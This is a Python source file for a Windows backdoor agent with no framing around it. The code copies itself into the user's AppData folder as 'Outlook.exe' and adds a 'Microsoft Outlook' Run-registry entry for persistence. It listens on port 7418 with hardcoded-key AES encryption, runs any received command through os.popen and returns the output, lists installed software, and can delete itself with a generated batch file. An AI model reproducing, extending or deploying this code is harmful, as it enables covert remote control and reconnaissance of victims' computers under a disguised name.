#!/usr/bin/python
# -*- coding: utf8 -*-

############ Module #############
from socket import error as SocketError
from socket import *
from _winreg import *
import _winreg as winreg
from Crypto.Cipher import AES
import os, shutil, pickle, base64,subprocess
import tempfile
############ Global #############
CheckIp = socket(AF_INET, SOCK_DGRAM)
try:
    CheckIp.connect(('google.com', 0))
    IpAddress = CheckIp.getsockname()[0]
except:
    pass
    IpAddress = "NotFound"

StartupProgram = []
Username = os.environ.get('USERNAME')

############ Class #############
class Main(object):
    def __init__(self):
        secret = "a12a87aAw2351cE58a8s7SqwD2f46eSA"
        self.BLOCK_SIZE = 32
        self.PADDING = '{'
        self.cipher = AES.new(secret)

    def Conncet(self):
        # Open socket and withing to connect
        self.Regme = self.Agent_Check()
        Server = socket(AF_INET, SOCK_STREAM)
        self.server = Server
        Server.bind(("", 7418))
        Server.listen(1)
        Client, Addr = Server.accept()
        self.client  = Client
        self.buffer  = 2048
        return Client, Addr

    def Agent_Check(self, ):
        # Check if the agent is location
        StartupProgram = []
        if not os.path.isfile("C:\Users\%s\AppData\Roaming\Outlook.exe" % (Username)):
            try:
                shutil.copy("Agent.exe", "C:\Users\%s\AppData\Roaming\Outlook.exe" % (Username))
                return "Regme"
            except:
                pass
        else:
            return "NotReg"
        # check if the client is up from startup
        aKey = OpenKey(ConnectRegistry(None, HKEY_CURRENT_USER), r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        for i in range(1024):
            try:
                n, v, t = EnumValue(aKey, i)
                StartupProgram.append(n)
            except EnvironmentError:
                break
        CloseKey(aKey)
        if not "C:\Users\%s\AppData\Roaming\Outlook.exe" in StartupProgram:
            aKey = OpenKey(ConnectRegistry(None, HKEY_CURRENT_USER), r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                           0, KEY_WRITE)
            try:
                SetValueEx(aKey, "Microsoft Outlook", 0, REG_SZ,
                           r"C:\Users\%s\AppData\Roaming\Outlook.exe  /background" % (Username))
            except EnvironmentError:
                CloseKey(aKey)

    def Encryption(self):
        # Encryption text
        pad = lambda s: s + (self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE) * self.PADDING
        return lambda c, s: base64.b64encode(c.encrypt(pad(s)))

    def Decryption(self):
        # Decryption text
        return lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(self.PADDING)

    def Send_Message(self, Text):
        # Encryption message and Send message to client
        self.client.send(self.Encryption()(self.cipher, Text))

    def Receive_Message(self):
        # Decryption message and return message to client
        return self.Decryption()(self.cipher, self.client.recv(self.buffer))

    def Program_Install(self):
        # return all program install
        # check if 32 or 64 bit proc
        proc_arch = os.environ['PROCESSOR_ARCHITECTURE'].lower()
        proc_arch64 = os.environ['PROCESSOR_ARCHITEW6432'].lower()
        ProgramInstall = []

        if proc_arch == 'x86' and not proc_arch64:
            arch_keys = {0}
        elif proc_arch == 'x86' or proc_arch == 'amd64':
            arch_keys = {winreg.KEY_WOW64_32KEY, winreg.KEY_WOW64_64KEY}
        else:
            raise Exception("Unhandled arch: %s" % proc_arch)

        for arch_key in arch_keys:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0,
                                 winreg.KEY_READ | arch_key)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                try:
                    skey_name = winreg.EnumKey(key, i)
                    skey = winreg.OpenKey(key, skey_name)
                    ProgramInstall.append(winreg.QueryValueEx(skey, 'DisplayName')[0])
                except OSError as e:
                    continue
                finally:
                    skey.Close()
        return ProgramInstall,"close"

    def Close_Socket(self):
        self.client.close()
        self.server.close()

    def Remove_Agent(self):
        with open("Outlook_serial.bat", "w") as f:
            f.write('@echo off\n')
            f.write("TASKKILL /F /IM Agent.exe\n")
            f.write("TASKKILL /F /IM Outlook.exe\n")
            f.write("timeout 5 > NUL\n")
            f.write('if exist "%s\Agent.exe" del / F / Q "%s\Agent.exe"\n' % (os.getcwd(), os.getcwd()))
            f.write('if exist "C:\Users\%s\AppData\Roaming\Outlook.exe" del / F / Q "C:\Users\%s\AppData\Roaming\Outlook.exe"\n' % (Username, Username))
            f.write('del "%s\Outlook_serial.bat"\n'%(os.getcwd()))
            f.write('exit')
        subprocess.call('Outlook_serial.bat', stdout=subprocess.PIPE)

    def Start_Program(self):
        while True:
            try:
                Client, Addr = self.Conncet()
                self.Send_Message(IpAddress)
                #print '[+] Client connected: {0}'.format(IpAddress)
                if self.Regme == "Regme":
                    self.Send_Message("Regme")
                else:
                    self.Send_Message("Hello Client")
                Message = self.Receive_Message()
                if Message == "programlist":
                    self.Send_Message(pickle.dumps(self.Program_Install()))
                    self.Close_Socket()
                elif Message == "remove_agent":
                    self.Remove_Agent()
                    self.Close_Socket()
                else:
                    Check_Command = os.popen(Message).read()
                    if Check_Command == "":
                        self.Send_Message("Wrong command, Please try again\n")
                        self.Close_Socket()
                    else:
                        self.Send_Message(Check_Command)
                        self.Close_Socket()
            except SocketError:
                try:
                    self.Close_Socket()
                except AttributeError:
                    self.server.close()
                continue

if __name__ == '__main__':
    Main().Start_Program()